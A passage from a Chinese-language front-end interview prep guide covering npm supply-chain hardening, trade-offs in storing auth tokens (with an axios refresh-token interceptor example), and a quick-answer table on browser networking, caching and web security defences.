@mycorp:registry=https://npm.mycorp.com/   # 私有作用域固定到内部源，防依赖混淆
```

```json
// package.json：强制锁定有问题的传递依赖版本
{ "overrides": { "some-lib": "1.2.3" } }
```

```html
<script src="https://cdn.example.com/lib@1.0.0/lib.min.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

### 面试答题要点
1. **锁文件必须提交**，CI 使用 `npm ci` / `--frozen-lockfile`，保证可复现。
2. `npm audit`、Dependabot/Renovate、Snyk 持续扫描；高危漏洞纳入 CI 门禁。
3. 禁用或白名单化安装脚本（pnpm 10 默认不执行依赖的生命周期脚本，需 `onlyBuiltDependencies` 显式允许）。
4. 私有包使用 scope + 固定 registry 防依赖混淆；第三方 CDN 脚本加 SRI。
5. 新版本延迟升级（如 pnpm `minimumReleaseAge`）、关注 npm provenance（来源证明）与发布者 2FA / Trusted Publishing。

### 易错点 / 追问
- `^1.2.3` 会自动接受小版本更新，没有锁文件时投毒版本会被直接装上。
- `npm audit` 只能发现**已知**漏洞，对零日投毒无效。
- devDependencies 也危险：构建时可窃取环境变量（CI 密钥）。

---

## 3.5 敏感信息与 Token 存储取舍

> 考频 ★★

### 前端敏感信息不落地
- 前端代码对用户完全透明，**任何密钥（AK/SK、数据库密码、大模型 API Key）都不能出现在前端代码或产物中**；需要时由后端 / BFF 代理调用。
- 构建工具注入的环境变量（`VITE_*`、`NEXT_PUBLIC_*`）会被打进产物，只能放公开信息。
- 生产环境关闭或不公开 Source Map（或仅上传到监控平台）。
- 日志、埋点、错误上报中脱敏（手机号、身份证、Token）。
- 敏感页面 `Cache-Control: no-store`；URL 中不带 Token（会进入历史记录、Referer、服务器日志）。

### Token 存储方案对比

| 方案 | XSS 风险 | CSRF 风险 | 优缺点 |
|---|---|---|---|
| localStorage / sessionStorage | **高**：脚本可直接读取并外传 | 无（需手动加 Header） | 实现简单、跨域 API 方便；一旦 XSS 即泄露 |
| HttpOnly Cookie | 低：脚本读不到（但可在页面内借身份发请求） | **有**，需 SameSite + CSRF Token | 自动携带；跨域需 CORS + credentials 配置 |
| 内存（JS 变量） | 中：XSS 时仍可在运行时获取 | 无 | 刷新即丢失，需配合刷新机制 |
| **内存 Access Token + HttpOnly Cookie Refresh Token** | 较低 | 刷新接口需防 CSRF | 推荐的 SPA 折中：短期 AT 放内存，RT 放 `HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh` |
| BFF 模式（Token 只在服务端） | 最低 | 用 SameSite + CSRF 防护 | 浏览器只持有会话 Cookie，Token 从不下发，安全性最好但需要服务端 |

```js
// 内存 AT + Cookie RT 的刷新示意（axios 拦截器，并发请求只刷新一次）
let accessToken = null;
let refreshing = null;
api.interceptors.request.use((cfg) => {
  if (accessToken) cfg.headers.Authorization = `Bearer ${accessToken}`;
  return cfg;
});
api.interceptors.response.use(null, async (err) => {
  if (err.response?.status !== 401 || err.config._retry) throw err;
  refreshing ??= axios.post('/auth/refresh', null, { withCredentials: true })
    .then(r => (accessToken = r.data.accessToken))
    .finally(() => (refreshing = null));
  await refreshing;
  err.config._retry = true;
  return api(err.config);
});
```

### 面试答题要点
1. 前端无秘密：密钥只能放服务端，构建期环境变量会进产物。
2. localStorage 怕 XSS，Cookie 怕 CSRF；没有绝对安全，根本是先防住 XSS。
3. 推荐：短期 Access Token 放内存 + Refresh Token 放 HttpOnly/Secure/SameSite Cookie；安全要求高时用 BFF。
4. 配套：Token 短有效期、Refresh Token 轮换（检测重放）、登出时服务端吊销。

### 易错点 / 追问
- 「HttpOnly 就能防 XSS」是错的，只能防 Cookie 被窃取，攻击者仍可以在页面中发请求。
- JWT 无状态难以主动吊销，需要黑名单或短有效期。
- 多标签页同步登录状态：`BroadcastChannel` / `storage` 事件。

---

# 四、高频题速答清单

| 题目 | 一句话核心 |
|---|---|
| 输入 URL 发生了什么 | URL 处理 → 缓存 → DNS → TCP/TLS（或 QUIC）→ 请求响应 → 提交导航 → DOM/CSSOM → 布局 → 分层绘制 → 合成上屏 |
| 为什么 JS 阻塞渲染 | 共用主线程 + JS 可改 DOM/CSSOM，同步脚本暂停解析；CSS 又阻塞后续 JS |
| 重排与重绘 | 改几何走 Layout，改外观走 Paint，transform/opacity 只走合成 |
| 跨域方案 | CORS（主流）、反向代理/BFF、postMessage、WebSocket；JSONP 已过时 |
| 简单请求 vs 预检 | GET/HEAD/POST + 安全列表头 + 三种 Content-Type，否则先 OPTIONS |
| SameSite | Strict 全不带；Lax 仅顶级 GET 导航带（Chrome 默认）；None 全带须 Secure |
| 强缓存与协商缓存 | max-age 内不发请求；过期带 ETag/Last-Modified 验证，304 复用 |
| no-cache vs no-store | 前者存但每次验证，后者不存 |
| HTTP/2 解决了什么、剩下什么 | 解决 HTTP 队头阻塞、头部冗余、连接数；剩 TCP 队头阻塞、握手延迟、连接迁移 → HTTP/3 |
| TLS 1.2 vs 1.3 | 2-RTT → 1-RTT（0-RTT 恢复），强制前向安全，证书加密 |
| SSE vs WebSocket | SSE 单向 HTTP 自动重连适合 LLM 流；WS 全双工适合聊天协同 |
| XSS 防御 | 上下文编码、避免危险 sink、DOMPurify、严格 CSP、Trusted Types、HttpOnly |
| CSRF 防御 | SameSite、CSRF Token、Origin/Referer、Fetch Metadata、GET 无副作用 |
| 点击劫持 | CSP frame-ancestors / X-Frame-Options |
| Token 存哪 | 内存 AT + HttpOnly Cookie RT，或 BFF；localStorage 怕 XSS |
